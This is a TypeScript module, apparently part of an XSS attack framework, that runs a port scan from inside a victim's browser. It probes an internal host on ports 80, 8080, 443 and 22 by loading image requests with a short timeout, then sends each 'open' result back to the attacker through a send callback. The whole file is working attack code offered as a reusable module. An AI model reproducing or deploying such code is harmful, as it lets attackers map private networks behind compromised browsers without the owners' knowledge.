import { XSSModule } from '../types/index.js';

export const portScanModule: XSSModule = {
  name: 'Port Scan',
  description: 'Scans a given network range for given port numbers.',
  
  execute: (send) => {
    const TIMEOUT = 50;
    const NETWORK = '192.168.0.1'; // Single host for demo
    const PORTS = [80, 8080, 443, 22];

    PORTS.forEach(port => checkPortOpen(NETWORK, port));

    function checkPortOpen(host: string, port: number) {
      const a = document.createElement('a');
      a.href = 'http://0/';
      a.hostname = host;
      a.port = port.toString();
      const href = a.href;

      const img = new Image();
      img.onerror = img.onload = () => {
        send({
          host,
          port,
          status: 'open'
        });
      };

      setTimeout(() => {
        img.onerror = img.onload = null;
        img.src = '';
      }, TIMEOUT);

      img.src = href;
    }
  },
  
  handleResult: (log, data) => {
    log(`Port ${data.port} on ${data.host} is ${data.status}`);
  }
};

export default portScanModule;